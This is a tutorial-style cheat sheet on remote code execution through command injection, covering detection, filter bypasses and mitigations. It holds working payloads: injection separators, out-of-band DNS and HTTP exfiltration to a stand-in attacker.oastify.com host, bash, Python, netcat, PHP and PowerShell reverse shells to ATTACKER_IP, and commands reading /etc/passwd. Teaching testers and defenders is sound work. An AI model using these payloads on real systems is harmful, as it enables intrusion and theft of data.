# What is RCE?

Remote Code Execution (RCE) lets an attacker run their own commands or code on a target server. It is the top prize in most engagements because it usually means **full control of the host**. RCE rarely appears by itself - it often chains from something smaller: a file upload, a deserialization bug, an SSTI, or command injection in a shell call.

Example of vulnerable code (command injection):

```php
// VULNERABLE - $_GET['host'] is dropped straight into a shell command
system("ping -c 1 " . $_GET['host']);
```

Request `?host=127.0.0.1; id` and the server runs `ping -c 1 127.0.0.1; id` - your `id` command executes.

## Common sources

- **OS command injection** - user input reaches a shell (`system()`, `exec()`, `popen()`, backticks)
- **Code injection** - input reaches `eval()`, `assert()`, `pickle.loads()`, or a template engine (SSTI)
- **Insecure deserialization** - crafted objects trigger gadget chains (Java `ObjectInputStream`, PHP `unserialize`, Python `pickle`)
- **File upload + include** - upload a web shell, then request it (see Unrestricted File Upload)
- **Known CVEs** - Log4Shell, Struts, Spring4Shell, etc.

## Step 1 - Detect command injection

Inject shell metacharacters after any value that might reach a command, one at a time:

```bash
; id            # command separator (Linux)
| id            # pipe
|| id           # run if previous fails
& id            # background / separator
&& id           # run if previous succeeds
`id`            # backtick command substitution
$(id)           # modern command substitution
%0a id          # newline (URL-encoded), bypasses some filters
```

Chained onto a real value:

```bash
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
```

## Step 2 - Blind detection (no output returned)

When you cannot see command output, prove execution another way:

```bash
# Time delay - if the response is ~10s slower, it ran
& ping -c 10 127.0.0.1 &
& sleep 10 &

# Out-of-band (OAST) - force a DNS/HTTP callback you control
& nslookup $(whoami).attacker.oastify.com &
& curl http://attacker.oastify.com/$(whoami) &

# Exfiltrate a file over DNS, chunk by chunk
& nslookup `cat /etc/passwd|head -1|base64`.attacker.oastify.com &
```

## Step 3 - Get an interactive shell (in scope only)

```bash
# 1) Start a listener on YOUR machine
nc -lvnp 4444

# 2) Inject one of these reverse-shell payloads on the target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
nc -e /bin/bash ATTACKER_IP 4444          # if nc supports -e
php -r '$s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Windows target
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}"
```

Upgrade a dumb shell to a full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then press Ctrl-Z, and on your box:
stty raw -echo; fg
# back in the shell:
export TERM=xterm
```

> Tip: use [revshells.com](https://www.revshells.com/) to generate reverse shells for any language/OS and URL-encode them.

## Tools

- [Burp Suite Collaborator](https://portswigger.net/burp) - catch blind/out-of-band callbacks
- [interactsh](https://github.com/projectdiscovery/interactsh) - open-source OAST server
- [commix](https://github.com/commixproject/commix) - automated command-injection exploitation
- [ysoserial](https://github.com/frohoff/ysoserial) (Java) / [ysoserial.net](https://github.com/pwntester/ysoserial.net) - deserialization gadget chains

## Filter bypasses

```bash
# Spaces filtered
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd

# Keyword "cat" blocked
c''at /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd

# Slashes blocked
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

## Mitigation - the fix

- **Never pass user input to a shell.** Use language APIs that take an argument array, not a string:

```python
# UNSAFE
os.system("ping -c 1 " + host)
# SAFE - no shell, arguments are separate
subprocess.run(["ping", "-c", "1", host], shell=False)
```

- Avoid `eval`, `exec`, `pickle.loads`, and dynamic code loading on untrusted data.
- Patch known-vulnerable libraries; keep dependencies updated (deserialization gadgets, Log4j).
- Run services as a **low-privilege** user; sandbox with containers/seccomp/AppArmor.
- **Egress-filter** the server so reverse shells cannot dial out.
- Allowlist input (e.g. validate `host` is a valid IP/hostname).

## Practice

- [PortSwigger OS command injection labs](https://portswigger.net/web-security/os-command-injection)
- TryHackMe "Command Injection", HTB machines

## Deep dive

- [RCE - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)

## CWE

- CWE-94: Improper Control of Generation of Code
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
